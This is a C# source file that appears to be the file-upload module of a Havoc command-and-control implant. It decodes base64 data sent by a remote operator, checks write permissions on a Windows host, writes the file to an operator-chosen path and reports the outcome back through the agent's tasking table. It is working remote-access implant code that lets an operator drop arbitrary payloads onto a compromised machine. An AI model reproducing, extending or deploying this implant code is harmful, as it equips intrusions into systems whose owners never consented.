using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace HavocImplant.AgentFunctions
{
    public class Upload
    {
        public static void Run(Implant agent, string args, int taskId)
        {
            bool isRelativePath = false;
            string outputLocation = args.Split(new char[] { ';' }, 2)[0].Substring(12);

            if (outputLocation.EndsWith("\\") || string.IsNullOrEmpty(outputLocation))
            {
                agent.taskingInformation[taskId] = new Implant.task(agent.taskingInformation[taskId].taskCommand.Split(';')[0], ($"[+] Output for [{agent.taskingInformation[taskId].taskCommand.Split(new char[] { ';' }, 2)[0]}]\n Please include the file name in the path to upload").Replace("\\", "\\\\"));
                return;
            }

            if (!outputLocation.StartsWith("\\") && !Regex.Match(outputLocation.ToLower(), @"^\D:\\").Success) isRelativePath = true;
            string dir = parseDirectory(outputLocation, isRelativePath);

            outputLocation = Path.GetFullPath(Path.Combine(new string[] { dir, outputLocation }));

            Console.WriteLine($"Parsed upload directory is {dir}");
            Console.WriteLine($"Output upload location is {outputLocation}");
            byte[] fileBytes = Convert.FromBase64String(args.Split(new char[] { ';' }, 2)[1]);
            Console.WriteLine($"File to upload is {fileBytes.Length} bytes long");

            if (Directory.Exists(dir))
            {
                if (checkWriteAccess(dir)) //success
                {
                    File.WriteAllBytes(outputLocation, fileBytes);
                    if (!File.Exists(outputLocation)) agent.taskingInformation[taskId] = new Implant.task(agent.taskingInformation[taskId].taskCommand.Split(';')[0], ($"[+] Output for [{agent.taskingInformation[taskId].taskCommand.Split(new char[] { ';' }, 2)[0]}]\nSomething went wrong when uploading to {outputLocation}").Replace("\\", "\\\\"));
                    else agent.taskingInformation[taskId] = new Implant.task(agent.taskingInformation[taskId].taskCommand.Split(';')[0], ($"[+] Output for [{agent.taskingInformation[taskId].taskCommand.Split(new char[] { ';' }, 2)[0]}]\nUploaded to {outputLocation} with {fileBytes.Length} bytes").Replace("\\", "\\\\"));
                    agent.taskingInformation[taskId] = new Implant.task(agent.taskingInformation[taskId].taskCommand.Split(';')[0], ($"[+] Output for [{agent.taskingInformation[taskId].taskCommand.Split(new char[] { ';' }, 2)[0]}]\nUploaded to {outputLocation} with {fileBytes.Length} bytes").Replace("\\", "\\\\"));
                    return;
                }
                else
                {
                    agent.taskingInformation[taskId] = new Implant.task(agent.taskingInformation[taskId].taskCommand.Split(';')[0], ($"[+] Output for [{agent.taskingInformation[taskId].taskCommand.Split(new char[] { ';' }, 2)[0]}]\nCould not upload {outputLocation} due to lack of permissions").Replace("\\", "\\\\"));
                    return;
                }
            }
            else
            {
                agent.taskingInformation[taskId] = new Implant.task(agent.taskingInformation[taskId].taskCommand.Split(';')[0], ($"[+] Output for [{agent.taskingInformation[taskId].taskCommand.Split(new char[] { ';' }, 2)[0]}]\n{dir} does not exist").Replace("\\", "\\\\"));
                return;
            }
        }
        public static bool checkWriteAccess(string dir)
        {
            string DirectoryPath = dir;
            FileSystemRights AccessRight = FileSystemRights.CreateFiles | FileSystemRights.WriteData;


            AuthorizationRuleCollection rules = Directory.GetAccessControl(DirectoryPath).GetAccessRules(true, true, typeof(System.Security.Principal.SecurityIdentifier));
            WindowsIdentity identity = WindowsIdentity.GetCurrent();

            foreach (FileSystemAccessRule rule in rules)
            {
                if (identity.Groups.Contains(rule.IdentityReference))
                {
                    if ((AccessRight & rule.FileSystemRights) == AccessRight)
                    {
                        if ((AccessRight & rule.FileSystemRights) == AccessRight && (rule.FileSystemRights & FileSystemRights.WriteData) > 0)
                            return true;
                    }
                }
            }
            return false;
        }
        public static string parseDirectory(string dir, bool isRelativePath)
        {
            dir = dir.Replace("\"", "");
            string retVal = "";
            if (!isRelativePath)
            {
                var tmp = Regex.Split(dir, @"(?<=[\\])").ToList<string>();
                tmp.RemoveAt(tmp.Count - 1);
                dir = Path.GetFullPath(Path.Combine(new string[] { String.Concat(tmp.ToArray<string>()) }));
            }
            else
                dir = Path.GetFullPath(Directory.GetCurrentDirectory());
            return dir;
        }
    }
}
